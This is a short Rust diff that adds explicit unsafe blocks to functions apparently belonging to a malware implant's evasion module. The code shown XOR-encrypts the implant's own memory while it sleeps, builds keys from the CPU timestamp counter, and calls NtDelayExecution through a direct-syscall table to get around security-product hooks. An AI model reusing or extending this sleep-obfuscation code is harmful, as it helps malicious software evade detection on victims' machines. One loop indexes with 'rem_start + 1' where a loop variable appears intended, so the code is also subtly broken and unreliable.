@@ -8,7 +8,7 @@ use crate::debug;
 static REGION_BASE: AtomicUsize = AtomicUsize::new(0);
 static REGION_SIZE: AtomicUsize = AtomicUsize::new(0);
 
-unsafe fn xor_region(base: usize, size: usize, key: &[u8; 16]) {
+unsafe fn xor_region(base: usize, size: usize, key: &[u8; 16]) { unsafe {
     let ptr = base as *mut u8;
 
     // build two u64 key halves for fast 8 bytes xor
@@ -31,9 +31,9 @@ unsafe fn xor_region(base: usize, size: usize, key: &[u8; 16]) {
     for i in 0..remainder {
         *ptr.add(rem_start + 1) ^= key[i % 16];
     }
-}
+}}
 
-unsafe fn generate_xor_key() -> [u8; 16] {
+unsafe fn generate_xor_key() -> [u8; 16] { unsafe {
     let tsc1: u64;
     let tsc2: u64;
     core::arch::asm!(
@@ -71,9 +71,9 @@ unsafe fn generate_xor_key() -> [u8; 16] {
     }
 
     key
-}
+}}
 
-unsafe fn plain_sleep(duration: i64) {
+unsafe fn plain_sleep(duration: i64) { unsafe {
     let mut timeout = duration;
     let table = crate::core::ssn_table::syscall_table();
     let e = &table.ssns.nt_delay_execution;
@@ -83,9 +83,9 @@ unsafe fn plain_sleep(duration: i64) {
         0usize,                             // Alertable = FALSE
         &mut timeout as *mut i64 as usize,  // DelayInterval.
     );
-}
+}}
 
-pub unsafe fn encrypted_sleep(duration: i64) {
+pub unsafe fn encrypted_sleep(duration: i64) { unsafe {
     let base = REGION_BASE.load(Ordering::SeqCst);
     let size = REGION_SIZE.load(Ordering::SeqCst);
 
@@ -146,5 +146,5 @@ pub unsafe fn encrypted_sleep(duration: i64) {
 
     // decrypt
     xor_region(base, size, &key);
-}
+}}
 
